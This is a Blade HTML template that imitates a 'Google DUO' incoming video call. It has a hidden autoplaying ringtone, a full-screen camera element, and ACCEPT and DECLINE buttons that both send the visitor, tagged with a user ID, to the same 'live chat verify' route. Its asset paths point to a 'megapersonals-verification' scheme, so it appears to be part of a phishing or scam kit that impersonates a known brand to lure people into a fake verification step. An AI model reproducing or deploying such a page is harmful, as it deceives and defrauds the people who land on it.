<!--click clount-->
<html lang="en">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Calling...</title>
      <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
      <link rel="icon" type="image/svg+xml" href="{{ asset('assets/megapersonals-verification/images/du_icon.svg') }}">
      <script src="https://cdn.tailwindcss.com"></script>
      <style>
         #camera {
          object-fit: cover;
          width: 100vw;
          height: 100vh;
          position: fixed;
          top: 0;
          left: 0;
          z-index: -1;
         }
      </style>
   </head>
   <body>
      <audio id="myAudio" autoplay controls="false" style="display:none;">
         <source src="/tune.mp3" type="audio/mpeg">
         Your browser does not support the audio element.
      </audio>
      <div id="mainSystem" class="h-screen z-1 relative flex items-center justify-center">
         <video id="camera" playsinline="" autoplay=""></video>
         <div id="videoChatBlock" class=" max-w-[400px] bg-white rounded">
            <div class="p-5 ">
               <div class="mx-auto flex items-center justify-center mt-5">
                  <img class="h-16 w-16 text-center" src="{{ asset('assets/megapersonals-verification/images/du_icon.svg') }}" alt="">
               </div>
               <h2 class="text-3xl font-bold text-blue-900 text-center">Google DUO</h2>
               <br>
               &nbsp;
               <hr>
                  <a href="{{ route('due.live.chat.verify', $user_id) }}" style="background-color:rgb(59 130 246 / var(--tw-bg-opacity))" class="bg-blue-500 hover:bg-black-700 text-white font-bold py-2 px-4 rounded mr-2">DECLINE</a>

                  <a href="{{ route('due.live.chat.verify', $user_id) }}" style="background-color:rgb(34 197 94 / var(--tw-bg-opacity))" class="bg-green-500 hover:bg-green-700 text-white font-bold py-2 px-4 rounded">ACCEPT</a>
            </div>
         </div>
      </div>
   </body>
</html>
